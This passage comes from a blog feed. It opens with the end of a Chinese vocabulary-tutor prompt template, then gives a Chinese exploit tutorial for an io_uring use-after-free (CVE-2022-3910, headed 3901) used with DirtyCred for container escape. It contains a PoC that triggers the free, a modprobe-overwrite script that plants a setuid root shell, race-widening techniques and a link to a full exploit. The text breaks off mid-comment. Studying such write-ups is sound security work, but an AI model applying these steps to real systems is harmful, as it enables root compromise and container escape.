class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs prompt"># 角色定义<br><br>你是一名专业的中英文双语教育专家和个性化学习顾问，专门帮助中文母语用户高效学习和记忆英语单词。你能够根据用户的英语水平和学习偏好，提供定制化的单词学习体验。<br><br>## 初始化设置<br><br>在开始分析单词前，请先了解用户的学习情况：<br><br>**请回答以下问题以获得个性化学习体验：**<br>1. 您的英语水平：A.初学者 B.中级 C.高级<br>2. 您的学习目标：A.日常交流 B.学术考试 C.职场应用 D.兴趣爱好<br>3. 您偏好的记忆方式：A.视觉联想 B.音韵记忆 C.词根分析 D.情境故事<br>4. 您希望的输出详细程度：A.简明版 B.标准版 C.详细版<br><br>*如用户未提供偏好设置，默认使用标准版中级水平输出*<br><br>## 输出格式要求<br><br>请严格按照以下8个模块顺序输出，每个模块使用markdown格式：<br><br>---<br><br>## 📚 基础词义<br><br>**单词：** [用户提供的单词]  <br>**音标：** [英式/美式音标]  <br>**难度等级：** ⭐⭐⭐⭐⭐ [1-5星难度标识]  <br>**词性：** [详细标注所有词性]  <br>**核心含义：** [根据用户水平调整解释复杂度]  <br>**常用释义：** [按使用频率列出2-4个主要含义]<br><br>**💡 学习提示：** [根据用户水平给出针对性建议]<br><br>---<br><br>## 📝 实用例句<br><br>请提供3个不同语境的例句，根据用户目标调整场景：<br><br>**例句1：** [英文原句]  <br>**翻译：** [中文翻译]  <br>**场景：** [使用场景说明]  <br>**难度：** [标注句子难度等级]<br><br>**例句2：** [英文原句]  <br>**翻译：** [中文翻译]  <br>**场景：** [使用场景说明]  <br>**难度：** [标注句子难度等级]<br><br>**例句3：** [英文原句]  <br>**翻译：** [中文翻译]  <br>**场景：** [使用场景说明]  <br>**难度：** [标注句子难度等级]<br><br>**🎯 练习建议：** [根据用户水平提供例句运用练习]<br><br>---<br><br>## 🔍 词根词源<br><br>**词根：** [主要词根及含义]  <br>**词根家族：** [根据用户水平列举3-7个同词根单词]  <br>**词源：** [来源语言及原始含义]  <br>**记忆关联：** [与中文或用户已知词汇的关联]<br><br>**🧠 词根记忆法：** [个性化词根记忆策略]<br><br>---<br><br>## 🧩 词缀结构<br><br>**词缀分解：** [前缀-词根-后缀]的详细分析  <br>**各部分含义：** [分别解释每个组成部分]  <br>**同缀词汇：** [列举2-5个相同词缀的单词]  <br>**构词规律：** [总结该词缀的一般规律]<br><br>---<br><br>## 🏛️ 文化背景<br><br>**历史发展：** [单词的演变过程，根据用户水平调整深度]  <br>**文化内涵：** [在英美文化中的特殊含义]  <br>**使用语境：** [正式/非正式场合的使用区别]  <br>**注意事项：** [文化使用禁忌或注意事项]<br><br>---<br><br>## 🔄 词形变化<br><br>**名词形式：** [单数/复数及中文]  <br>**动词变化：** [时态变化及中文]  <br>**形容词/副词：** [相关形式及中文]  <br>**常用搭配：** [根据用户目标列举3-6个搭配]  <br>**高频短语：** [实用短语搭配]<br><br>**📈 进阶用法：** [适合用户水平的高级用法]<br><br>---<br><br>## 💡 个性化记忆技巧<br><br>**主推记忆法：** [根据用户偏好定制的主要记忆方法]  <br>**辅助记忆法：** [2-3种备选记忆策略]  <br>**记忆口诀：** [朗朗上口的记忆口诀]  <br>**联想画面：** [生动的视觉联想描述]<br><br>**🎨 创意记忆：** [独特的个性化记忆创意]<br><br>---<br><br>## 📖 情境故事<br><br>**英文故事：** [80-120词的英文小故事，根据用户水平调整词汇难度]<br><br>**中文翻译：** [对应的中文翻译]<br><br>**故事解析：** [解释故事情节与单词记忆的关联]<br><br>**🎭 角色扮演：** [建议用户的互动练习方式]<br><br>---<br><br>## 📊 学习反馈<br><br>**掌握度自评：** 请在学习后为自己打分 1-10分  <br>**困难点标记：** 哪个模块最难理解？  <br>**记忆效果：** 哪种记忆方法最有效？  <br>**改进建议：** 希望下次如何调整？<br><br>**🔄 下一步建议：** [根据该单词推荐相关学习内容]<br><br>---<br><br>## 互动学习功能<br><br>- **即时答疑：** 对任何模块有疑问请随时提问<br>- **难度调整：** 觉得太难或太简单请告知，我会调整<br>- **个性化定制：** 可以要求重点讲解某个模块<br>- **学习追踪：** 告诉我你的学习进度，我会提供连续性建议<br><br>## 特殊处理说明<br><br>- 专有名词/俚语：会特别标注 [特殊词汇] 并说明使用场合<br>- 不适用模块：标注 [该模块不适用] 并说明原因  <br>- 不确定信息：标注 [需要验证] 并提供替代解释<br>- 文化敏感词汇：会特别提醒使用注意事项<br><br>---<br><br>**准备开始您的个性化英语单词学习之旅吗？请先告诉我您的学习偏好，然后提供需要学习的单词！**<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Life &amp; Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IELTS</tag>
      
      <tag>English Learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-3901：利用DirtyCred进行容器逃逸</title>
    <link href="/2023/08/03/CVE-2022-3901-Container-Escape-via-File-based-DirtyCred/"/>
    <url>/2023/08/03/CVE-2022-3901-Container-Escape-via-File-based-DirtyCred/</url>
    
    <content type="html"><![CDATA[<p><ahref="https://nvd.nist.gov/vuln/detail/CVE-2022-3910">CVE-2022-3910</a>是一个io_uring上的UAF，可以通过DirtyCred很方便的提权，但我们需要覆盖<code>/proc/sys/kernel/modprobe</code>来尝试容器逃逸。</p><p>文中代码片段来自Linux kernel v6.0-rc5</p><h1 id="io_uring相关组件介绍">io_uring相关组件介绍</h1><p>io_uring 子系统由<a href="https://twitter.com/axboe">JensAxboe</a>创建，用于提高 I/O操作（文件读/写、socket发送/接收）的性能。一般来说此类需要与内核交互的I/O 操作会使用系统调用 (syscall)，但因为需要在用户态和内核态之间进行上下文切换，会产生大量开销，可能会对执行大量此类I/O 操作的程序（例如 Web 服务器）产生很大的性能损失。目前<ahref="https://github.com/nginx/unit/issues/511">计划</a>将其集成到 NGINXUnit 中。io_uring由内核子系统（主要位于<code>fs/io_uring.c</code>）和用户态库（<ahref="https://github.com/axboe/liburing">liburing</a>）组成。</p><p>io_uring 不会对每个请求使用系统调用，而是通过提交队列 (SQ) 和完成队列(CQ)两个环形缓冲区实现用户和内核态之间的通信。用户态程序将 I/O 请求放在SQ 上，内核将它们拿出来并处理，完成的请求放在 CQ上，同时允许用户态程序查看处理的结果。</p><p>SQ和CQ操作是异步的：向SQ添加请求永远不会阻塞，除非队列已满。</p><p>io_uring 可以配置为轮询SQ是否有新请求，或者使用系统调用<code>io_uring_enter</code>来通知内核存在新请求。然后内核可以在当前线程中处理该请求，或者将其委托给其他内核工作线程。</p><p><ahref="https://kernel-recipes.org/en/2022/wp-content/uploads/2022/06/axboe-kr2022-1.pdf">JensAxboe 的幻灯片中</a>介绍了漏洞相关的两个重要组件。</p><h2 id="fixed-files">Fixed files</h2><p>Fixed files, or direct descriptors, <ahref="https://lwn.net/Articles/863071/">可以被看作 io_uring特定的文件描述符</a>.io_uring会维护所有已注册文件的引用来减少操作文件描述符导致的额外开销，只有当fixedfiles未注册或 io_uring 实例被关闭之后才会释放此引用。</p><h2 id="ring-messages">Ring messages</h2><p>io_uring支持环之间的消息传递<code>io_uring_prep_msg_ring()</code>。根据<ahref="https://man.archlinux.org/man/extra/liburing/io_uring_prep_msg_ring.3.en">文档</a>所述，此操作会在目标环中创建一个CQE，并将其<code>res</code>和<code>user_data</code>设置为用户指定的值。</p><p><ahref="https://github.com/axboe/liburing/wiki/io_uring-and-networking-in-2023#ring-messages">如此处</a>所述，此功能可用于唤醒在环上等待的休眠任务，或者只是传递任意信息。</p><h1 id="cve-2022-3910">CVE-2022-3910</h1><p>CVE-2022-3910是因为<code>io_msg_ring()</code>函数不正确的更新引用计数。源文件在<ahref="https://elixir.bootlin.com/linux/v6.0-rc5/source/io_uring/msg_ring.c">这里</a>，相关代码片段如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">io_msg_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_kiocb *req, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> issue_flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_msg</span> *<span class="hljs-title">msg</span> =</span> io_kiocb_to_cmd(req, <span class="hljs-keyword">struct</span> io_msg);<br><span class="hljs-type">int</span> ret;<br><br>ret = -EBADFD;<br><span class="hljs-keyword">if</span> (!io_is_uring_fops(req-&gt;file))<br><span class="hljs-keyword">goto</span> done;<br><br><span class="hljs-keyword">switch</span> (msg-&gt;cmd) &#123;<br><span class="hljs-keyword">case</span> IORING_MSG_DATA:<br>ret = io_msg_ring_data(req);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> IORING_MSG_SEND_FD:<br>ret = io_msg_send_fd(req, issue_flags);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>ret = -EINVAL;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>done:<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>req_set_fail(req);<br>io_req_set_res(req, ret, <span class="hljs-number">0</span>);<br><span class="hljs-comment">/* put file to avoid an attempt to IOPOLL the req */</span><br>io_put_file(req-&gt;file);<br>req-&gt;file = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> IOU_OK;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过<ahref="https://github.com/torvalds/linux/commit/fc7222c3a9f56271fba02aabbfbae999042f1679">patch</a>中找可以了解详细的问题原因。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://starlabs.sg/blog/2023/images/07-container-escape-using-file-based-DirtyCred_001.png" /></p><p>通常io_uring 的消息传递功能需要与另一个 io_uring实例对应的文件描述符。如果我们传入其他引用，就只会调用<code>io_put_file()</code>并返回错误。</p><p>如果我们传入一个Fixedfiles，<code>io_put_file()</code>仍然会被调用，导致引用数-1，但实际上我们没有获取对该文件的额外引用。</p><h2 id="漏洞影响">漏洞影响</h2><p><code>io_put_file()</code>是<code>fput()</code>的wrapper。在这里可以看到<ahref="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/file_table.c#L374">源码</a>，主要代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">fput</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br><span class="hljs-keyword">if</span> (atomic_long_dec_and_test(&amp;file-&gt;f_count)) &#123;<br><span class="hljs-comment">// free the file struct</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们只需要重复触发漏洞直到引用计数降至0就可以释放对应的<code>file</code>结构体，同时<code>io_uring</code>会继续保留对其的引用，从而达成​一个经典的<strong>UAF</strong>​。</p><p>poc如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">r</span>;</span><br>io_uring_queue_init(<span class="hljs-number">8</span>, &amp;r, <span class="hljs-number">0</span>);<br><span class="hljs-type">int</span> target = open(TARGET_PATH, O_RDWR | O_CREAT | O_TRUNC, <span class="hljs-number">0644</span>);<br><br><span class="hljs-comment">// Register target file as fixed file.</span><br><span class="hljs-keyword">if</span> (io_uring_register_files(&amp;r, &amp;target, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;[-] io_uring_register_files&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> * <span class="hljs-title">sqe</span>;</span><br><br><span class="hljs-comment">// Refcount is currently 2</span><br><span class="hljs-comment">// (Check by by setting a breakpoint in io_msg_ring())</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">2</span>; i++) &#123;<br>sqe = io_uring_get_sqe(&amp;r);<br>io_uring_prep_msg_ring(sqe, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>sqe-&gt;flags |= IOSQE_FIXED_FILE;<br>io_uring_submit(&amp;r);<br>io_uring_wait_cqe(&amp;r, &amp;cqe);<br>io_uring_cqe_seen(&amp;r, cqe);<br>&#125;<br><br><span class="hljs-comment">// Refcount should now be 0, file struct should be freed.</span><br></code></pre></td></tr></table></figure><p>正常的利用方式可以通过跨缓存堆喷覆盖<code>sk_buff</code>的析构函数（不是<code>sk_buff-&gt;data</code>，因为它的最小分配太大了）以获得执行控制，exp如下：<ahref="https://starlabs.sg/blog/2023/07-container-escape-using-file-based-DirtyCred_old_source.zip">CVE-2022-3910.rar</a></p><h1 id="dirtycred">DirtyCred</h1><p>在我之前的一篇文章<ahref="https://mundi-xu.github.io/2022/10/08/DirtyCred/">DirtyCred与CVE-2021-4154漏洞分析</a>中详细介绍了DirtyCred的原理和利用方式，其主要核心思想就是<strong>AttackingOpen File Credentials</strong>.</p><h2 id="面临的困难">面临的困难</h2><p>一般来说，DirtyCred的利用方式是通过打开<code>/etc/passwd</code>来添加具有root 权限的新用户，但我们这里准备尝试利用<ahref="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique"><code>/sbin/modprobe</code></a>。</p><p>当我们尝试执行具有未知魔数（magicheader）的文件时，内核将<strong>以root 权限从 root命名空间</strong>调用全局内核变量<code>modprobe_path</code>指向的二进制文件（默认为<code>/sbin/modprobe</code>）。</p><p>所以我们只需要把<code>/sbin/modprobe</code>用以下 shell脚本覆盖：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">cp</span> /bin/sh /tmp/sh<br><span class="hljs-built_in">chmod</span> 4777 /tmp/sh<br></code></pre></td></tr></table></figure><p>当我们尝试执行具有无效魔数头的文件时，内核就会执行上述脚本，创建<code>/bin/sh</code>来获取root shell。</p><p>但实际上这种利用方式在容器化的环境中无效，因为在容器的命名空间中无法直接访问<code>/sbin/modprobe</code>，<code>modprobe_path</code>会被定位到<code>/proc/sys/kernel/modprobe</code>。</p><h2 id="proc文件系统"><code>/proc</code>文件系统</h2><p>根据<ahref="https://docs.kernel.org/filesystems/proc.html">官网文档</a>的定义，<code>/proc</code>作为一个伪文件系统，负责充当内核中内部数据结构的接口，可用于获取有关系统的信息并在运行时更改某些内核参数（sysctl）。其中<code>/proc/sys</code>子目录允许我们通过写文件的方式一样修改各种内核参数的值。例如<code>/proc/sys/kernel/modprobe</code>会直接指向内核全局变量<code>modprobe_path</code>，修改该“文件”将对应地更改<code>modprobe_path</code>的值。</p><p>当然，如果我们<ahref="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/proc/proc_sysctl.c#L582">不是root</a>，我们就没办法向<code>/proc/sys/*</code>中写入任何内容。但这并不是一个大问题，我们可以利用传统的DirtyCred去写入<code>/etc/passwd</code>来实现本地权限提升。</p><p>需要注意的是这些对文件的操作需要特定的处理函数，其中<code>/proc/sys/*</code>与<code>file</code>结构体相关联的<code>f_op</code>会被设置为<code>proc_sys_file_operations</code>。但是inode加锁依赖于假设<code>ext4_buffered_write_iter()</code>可以成功写入目标文件，而对<code>/proc/sys/*</code>文件执行会导致未定义行为，返回错误代码。</p><p>而为了成功利用DirtyCred，我们必须在调用写入处理程序之前替换<code>file</code>结构体，这意味着有如下竞争窗口：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vfs_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br><span class="hljs-type">ssize_t</span> ret;<br><br><span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))<br><span class="hljs-keyword">return</span> -EBADF;<br><span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE))<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-comment">// RACE WINDOW START</span><br><span class="hljs-keyword">if</span> (unlikely(!access_ok(buf, count)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br>ret = rw_verify_area(WRITE, file, pos, count);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-keyword">if</span> (count &gt; MAX_RW_COUNT)<br>count =  MAX_RW_COUNT;<br><br>file_start_write(file);<br><span class="hljs-comment">// RACE WINDOW END</span><br><span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write)<br>ret = file-&gt;f_op-&gt;write(file, buf, count, pos);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write_iter)<br>ret = new_sync_write(file, buf, count, pos);<br><span class="hljs-keyword">else</span><br>ret = -EINVAL;<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>fsnotify_modify(file);<br>add_wchar(current, ret);<br>&#125;<br>inc_syscw(current);<br>file_end_write(file);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出来窗口很小，我们需要想办法扩大窗口。</p><h2 id="a-new-target-aio_write">A new target:<code>aio_write()</code></h2><p><ahref="https://blog.cloudflare.com/io_submit-the-epoll-alternative-youve-never-heard-about/">内核AIO 子系统</a>（与 POSIX AIO 不同）是一个有点过时的异步 I/O 接口，有点像io_uring 的前身。我们可以尝试利用其中的<ahref="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/aio.c#L1568"><code>aio_write()</code></a>函数，如果我们通过内核AIO 接口请求写入系统调用，该函数就会被调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">aio_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *req, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> iocb *iocb,</span><br><span class="hljs-params"> <span class="hljs-type">bool</span> vectored, <span class="hljs-type">bool</span> compat)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">inline_vecs</span>[<span class="hljs-title">UIO_FASTIOV</span>], *<span class="hljs-title">iovec</span> =</span> inline_vecs;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> <span class="hljs-title">iter</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><span class="hljs-type">int</span> ret;<br><br>ret = aio_prep_rw(req, iocb);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br>file = req-&gt;ki_filp;<br><br><span class="hljs-keyword">if</span> (unlikely(!(file-&gt;f_mode &amp; FMODE_WRITE)))<br><span class="hljs-keyword">return</span> -EBADF;<br><span class="hljs-keyword">if</span> (unlikely(!file-&gt;f_op-&gt;write_iter))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>ret = aio_setup_rw(WRITE, iocb, &amp;iovec, vectored, compat, &amp;iter);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> ret;<br>ret = rw_verify_area(WRITE, file, &amp;req-&gt;ki_pos, iov_iter_count(&amp;iter));<br><span class="hljs-keyword">if</span> (!ret) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Open-code file_start_write here to grab freeze protection,</span><br><span class="hljs-comment"> * which will be released by another thread in</span><br><span class="hljs-comment"> * aio_complete_rw().  Fool lockdep by telling it the lock got</span><br><span class="hljs-comment"> * released so that it doesn&#x27;t complain about the held lock when</span><br><span class="hljs-comment"> * we return to userspace.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (S_ISREG(file_inode(file)-&gt;i_mode)) &#123;<br>sb_start_write(file_inode(file)-&gt;i_sb);<br>__sb_writers_release(file_inode(file)-&gt;i_sb, SB_FREEZE_WRITE);<br>&#125;<br>req-&gt;ki_flags |= IOCB_WRITE;<br>aio_rw_done(req, call_write_iter(file, req, &amp;iter));<br>&#125;<br>kfree(iovec);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>aio_setup_rw()</code>会使用<code>copy_from_user()</code>从用户态复制<code>iovec</code>，同时它位于我们的竞争窗口内（在权限检查之后，但在写入程序处理完成之前）。因此，如果我们有权访问<ahref="https://blog.lizzie.io/using-userfaultfd.html">userfaultfd</a>或<ahref="https://exploiter.dev/blog/2022/FUSE-exploit.html">FUSE</a>，我们就可以稳定的利用这个竞争窗口，从而允许我们将写入操作重定向到<code>/proc/sys/kernel/modprobe</code>.</p><p>但是一般来说，不太会有人<strong>在容器​内</strong>启用 FUSE 或为userfaultfd打开内核页错误处理。所以看上去利用上述技术所需的条件过于严格，无法在一般的现实世界利用场景中发挥作用。</p><blockquote><p>注意：从技术角度来说，即使 userfaultfd内核页错误处理被禁用，如果我们有<code>CAP_SYS_PTRACE</code>能力，我们仍然可以使用它完成利用（实际检查在<ahref="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/userfaultfd.c#L2064">这里</a>）。当然，一般来说，即使拥有容器root的权限，我们也不太可能获取这个能力…….</p></blockquote><h2 id="slow-page-fault">Slow page fault</h2><p>让我们回过头考虑一下到目前为止 userfaultfd 和 FUSE在我们的漏洞利用过程中所扮演的角色。当内核尝试从用户空间复制数据并遇到页错误时：</p><ul><li>userfaultfd会导致出错的内核线程暂停，直到我们处理来自用户态的页错误。</li><li>当内核尝试将错误页加载到内存中时，将调用我们自定义的 FUSE读取处理程序。</li></ul><p>在这两种情况下，我们都可以简单地在<code>copy_from_user()</code>调用处暂停内核线程直到完成其他事情，例如制造对碰。但是是否有可能使页错误花费很长时间，以便我们可以在该时间窗口内完成堆喷？</p><p>gctf 2023中提出了<ahref="https://gist.github.com/pqlx/b1ed41e7557c042bcc7a8c74ea1feae8">利用文件打洞(Hole Punching)</a>来显着增加页错误造成的延迟：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://starlabs.sg/blog/2023/images/07-container-escape-using-file-based-DirtyCred_003.png" /></p><p><ahref="https://elixir.bootlin.com/linux/v6.0-rc5/source/mm/shmem.c#L2061"><code>shmem_fault()</code></a>中的注释解释了为什么会出现这种情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Trinity finds that probing a hole which tmpfs is punching can</span><br><span class="hljs-comment"> * prevent the hole-punch from ever completing: which in turn</span><br><span class="hljs-comment"> * locks writers out with its hold on i_rwsem.  So refrain from</span><br><span class="hljs-comment"> * faulting pages into the hole while it&#x27;s being punched.  Although</span><br><span class="hljs-comment"> * shmem_undo_range() does remove the additions, it may be unable to</span><br><span class="hljs-comment"> * keep up, as each new page needs its own unmap_mapping_range() call,</span><br><span class="hljs-comment"> * and the i_mmap tree grows ever slower to scan if new vmas are added.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * It does not matter if we sometimes reach this check just before the</span><br><span class="hljs-comment"> * hole-punch begins, so that one fault then races with the punch:</span><br><span class="hljs-comment"> * we just need to make racing faults a rare case.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The implementation below would be much simpler if we just used a</span><br><span 